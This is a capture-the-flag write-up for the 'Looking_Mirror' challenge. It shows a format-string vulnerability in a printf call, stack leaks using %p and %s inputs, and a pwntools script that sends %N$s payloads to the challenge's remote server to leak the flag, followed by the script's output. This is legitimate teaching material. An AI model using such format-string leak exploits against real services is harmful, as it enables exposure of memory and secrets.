# Looking_Mirror

**Description**:  
Welcome brave adventurer, gaze into the immortal mirror and best it with your queries. Let it spill the much guarded secret to a masterful conquest!

**Author:  [Ath3n1x](https://twitter.com/Ath3n1x)**

**Solution**: 
As usual, lets start with checking the permissions with `checksec`:
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Everything else enabled, except for canary. 

Now lets try running the binary:
```
Ask the looking mirror for the secret to a masterful conquest!
==============================================
Hi, you are face to face with the immortal mirror now!
Delve into its eternal wisdom and get the much gaurded secret.
Remember! it shall delight you with a reply, only if you are truly worthy. Otherwise it will echo your queries back to you.



> hi
Looking Mirror: hi

> I am Ath3n1x
Looking Mirror: I am Ath3n1x

> 
```
As the description says, it just spits out the input.

Now we will move on to examine the source code in ida/ghidra:
```
  do {
    printf("\n> ");
    fgets(local_98,0x40,stdin);
    printf("Looking Mirror: ");
    printf(local_98);
  } while( true );
```
Bingo, here is the culprit! Look at the printf statement `printf(local_98);`, a small friend called format specifier is missing leading to format string vulnerability.

Now that we found the vulnerability, lets again try running the binary and try to leak some stuff from stack.

```
> %p %p %p %p
Looking Mirror: 0x7ffd11b09970 (nil) (nil) 0x63605f4c248c

> %s %s %s %s %s
Looking Mirror: Looking Mirror: nil) (nil) 0x63605f4c248c
 (null) (null) 4t5_b4by_f0rm4773r}
 (null)
```
Woah, we got something. Now, lets prepare our exploit. I had a fuzzing script ready, so I used that for this challenge since we can directly leak the flag.

**Exploit:**
```python
from pwn import *

#elf = context.binary = ELF('./looking_mirror', checksec=False)

for i in range(100):
    try:
        #p = process(level='error')
        p = remote("13.234.11.113", 31481)
        p.sendlineafter(b'> ', '%{}$s'.format(i).encode())
        result = p.recvuntil(b'> ')
        print(str(i) + ': ' + str(result))
        p.close()
    except EOFError:
        pass
```

On running the script:
```
0: b'Looking Mirror: %0$s\n\n> '
1: b'Looking Mirror: Looking Mirror: \xe8\x03\n\n> '
2: b'Looking Mirror: (null)\n\n> '
3: b'Looking Mirror: (null)\n\n> '
4: b'Looking Mirror: iCTF{c0ngr4t5_b4by_f0rm4773r}\n\n\n> '
5: b'Looking Mirror: (null)\n\n> '
6: b'Looking Mirror: u\x91d*\xfc\x7f\n\n> '
8: b'Looking Mirror: (null)\n\n> '
10: b'Looking Mirror: shaktiCTF{c0ngr4t5_b4by_f0rm4773r}\n\n\n> '
```
Got it!

Flag: `shaktiCTF{c0ngr4t5_b4by_f0rm4773r}`              
